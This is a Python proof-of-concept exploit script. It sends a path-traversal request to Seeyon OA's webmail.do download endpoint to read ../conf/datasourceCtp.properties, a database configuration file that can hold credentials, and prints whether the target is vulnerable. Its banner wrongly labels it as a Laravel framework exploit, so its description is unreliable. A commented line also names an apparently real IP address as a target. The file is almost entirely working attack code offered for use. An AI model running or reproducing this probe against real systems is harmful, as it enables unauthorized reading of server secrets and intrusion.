#！/bin/bash/python3
# _*_ coding:utf-8 _*_

import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  POC：CNVD-2020-62422 ')
    print('+  Version: Laravel framework <= 5.5.21')
    print('+  使用格式:  python3 poc.py 192.168.1.1:80')
    print('+------------------------------------------')
def run(ip, port):
    proto = ['http', 'https']
    i = 0
    while i < len(proto):
        target = '{}://{}:{}'.format(proto[i], ip, port)
        proto_result = run_proto(target)
        if proto_result:
            return True
        else:
            i = i + 1

def run_proto(target):
    vuln_url = target + "/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "workflow" in response.text:
            print("目标{}存在漏洞".format(target))
            return True
        else:
            pass
    except Exception as e:
        pass

if __name__ == '__main__':
    title()
    target = sys.argv[1]
    #target = '121.46.30.170:443'
    ip = target.split(':')[0]
    port = int(target.split(':')[1])

    result = run(ip, port)
    if result:
        print("Exist")
    else:
        print("UnExist")
